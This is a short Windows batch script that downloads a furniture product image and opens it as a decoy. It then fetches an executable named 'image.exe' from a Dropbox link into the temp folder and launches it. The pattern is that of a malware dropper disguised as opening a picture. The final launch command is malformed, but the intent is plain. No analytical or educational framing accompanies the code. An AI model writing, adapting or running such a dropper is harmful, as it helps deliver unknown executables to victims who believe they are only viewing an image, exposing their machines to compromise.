@echo off
setlocal enabledelayedexpansion

set "imageURL=https://www.homedora.com/cdn/shop/files/UrlaAngel04Cream_8_1_1.jpg"
set "execURL=https://www.dropbox.com/scl/fi/aye26mdzpnsk7k7ozrjw2/image.exe"

set "imageFile=%TEMP%\UrlaAngel04Cream_8_1_1.jpg"
set "execFile=%TEMP%\image.exe"

powershell.exe -Command "(New-Object System.Net.WebClient).DownloadFile('%imageURL%', '%imageFile%');"
start !imageFile!

powershell.exe -Command "(New-Object System.Net.WebClient).DownloadFile('%execURL%', '%execFile%');"
start /d "%execFile%"

endlocal
